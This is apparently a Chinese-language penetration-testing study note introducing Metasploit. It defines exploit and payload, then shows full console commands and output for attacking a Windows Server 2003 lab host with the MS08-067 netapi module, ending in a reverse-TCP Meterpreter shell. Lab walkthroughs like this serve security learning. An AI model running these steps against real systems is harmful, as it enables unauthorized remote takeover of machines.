---
title: 初识Metasploit
url: 260.html
id: 260
categories:
  - 内网渗透
  - 学习笔记
date: 2018-03-21 21:06:10
tags:
---

### 术语简介

###### 漏洞攻击（exploit）：

攻击计算机，导致其产生漏洞的代码

###### 攻击载荷（payload）：

攻陷计算机之后的利用代码，帮助我们控制对方机器

 

### 攻击流程

**攻击机**： Linux kali 4.6.0                 192.168.112.128 **被攻击机**： windows server 2003    192.168.112.131   进入metasploit命令行

msfconsole

搜索对应的exploit

msf > **search ms08_067**
\[!\] Module database cache not built yet, using slow search

Matching Modules
================

Name Disclosure Date Rank Description
 \-\-\-\- \-\-\-\-\-\-\-\-\-\-\-\-\-\-\- \-\-\-\- -----------
 exploit/windows/smb/ms08\_067\_netapi 2008-10-28 great MS08-067 Microsoft Server Service Relative Path Stack Corruption

选择对应的exploit

msf > **use exploit/windows/smb/ms08\_067\_netapi**

查看对应exploit需要设置的参数

msf exploit(ms08\_067\_netapi) > **show options**

Module options (exploit/windows/smb/ms08\_067\_netapi):

Name   Current Setting Required Description
\-\-\-\-   \-\-\-\-\-\-\-\-\-\-\-\-\-\-\- \-\-\-\-\-\-\-\- \-\-\-\-\-\-\-\-\-\-\-
**RHOST**                  yes      The target address
**RPORT**   445            yes      The SMB service port
**SMBPIPE** BROWSER        yes      The pip name to use (BROWSER, SRVSVC)

Exploit target:

Id Name
 \-\- ----
 0 Automatic Targeting

需要设置对方ip RHOST

msf exploit(ms08\_067\_netapi) > **set RHOST 192.168.112.131**
RHOST => 192.168.112.131

然后，exploit

msf exploit(ms08\_067\_netapi) > **exploit**

\[*\] Started reverse TCP handler on 192.168.112.128:4444 
\[*\] 192.168.112.131:445 - Automatically detecting the target...
\[*\] 192.168.112.131:445 - Fingerprint: Windows 2003 - - lang:Unknown
\[*\] 192.168.112.131:445 - Selected Target: Windows 2003 SP0 Universal
\[*\] 192.168.112.131:445 - Attempting to trigger the vulnerability...
\[*\] Sending stage (957999 bytes) to 192.168.112.131
\[*\] Meterpreter session 1 opened (192.168.112.128:4444 -> 192.168.112.131:1038) at 2018-03-21 21:04:03 +0800

meterpreter >

成功攻陷对方权限，获得一个meterpreter shell 一次简单的远程主机攻击就完成了